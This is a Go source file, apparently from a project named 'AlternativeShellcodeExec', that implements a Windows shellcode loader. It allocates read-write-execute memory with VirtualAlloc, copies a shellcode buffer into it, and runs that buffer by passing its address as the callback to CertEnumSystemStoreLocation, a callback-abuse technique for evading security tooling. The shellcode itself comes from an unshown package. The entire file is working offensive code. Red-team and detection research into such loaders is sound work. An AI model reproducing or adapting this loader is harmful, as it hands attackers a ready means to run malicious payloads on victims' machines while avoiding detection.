package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

type PFN_CERT_ENUM_SYSTEM_STORE_LOCATION uintptr

func Run(op []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	crypt32 := syscall.MustLoadDLL("crypt32.dll")

	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	rtlcMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	certEnumSystemStoreLocation := crypt32.MustFindProc("CertEnumSystemStoreLocation")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	_, _, _ = rtlcMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&op[0])), uintptr(len(op)))
	callback := PFN_CERT_ENUM_SYSTEM_STORE_LOCATION(addr)
	_, _, _ = certEnumSystemStoreLocation.Call(0, 0, uintptr(callback))

	fmt.Println("Done.")
}

func main() {
	Run(util.ShellCode())
}
